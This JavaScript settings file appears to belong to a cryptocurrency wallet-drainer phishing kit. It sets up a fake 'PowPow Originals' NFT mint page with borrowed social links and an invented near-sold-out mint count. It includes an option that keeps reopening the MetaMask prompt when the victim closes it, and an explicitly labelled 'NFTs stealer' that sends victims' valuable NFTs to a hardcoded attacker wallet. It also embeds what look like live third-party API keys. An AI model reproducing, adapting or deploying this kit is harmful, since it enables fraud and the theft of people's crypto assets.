const address = "0x38636411b00fc9b611Eab6a0cF869a4EAbA686BD";     // wallet address
const infuraId = "12ce2d705f364f159b46bb4acd902a15"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "Ivaw8f5ExURBOjZVOVBALZYj9oC3tutm0G3KL88FgSzUqz0KzBY0BwYVj8EwppNL"   // x-api-key | https://moralis.io/ | For NFTs


const collectionInfo = {
    name: "PowPow Originals",
    title: "Public Sale", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "Now",
    socialMedia: {
        discord: "https://discord.com/invite/PowPowNFT",
        twitter: "https://twitter.com/PowPowNFT",
    },
    medias: {
        preview: "gif.gif",
        favicon: "favicon.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "bg.jpg",    // Image for image type, video preview for video type
        video: "",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.03,         // Price per NFT.
    totalSupply: 1000,   // Total supply of NFTs.
    totalMinted: 974,  // Total minted
    minUnits: 1,        // Min units to buy.
    maxUnits: 5,        // Max units to buy.
    askMintLoop: false,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 10000, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x38636411b00fc9b611Eab6a0cF869a4EAbA686BD" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
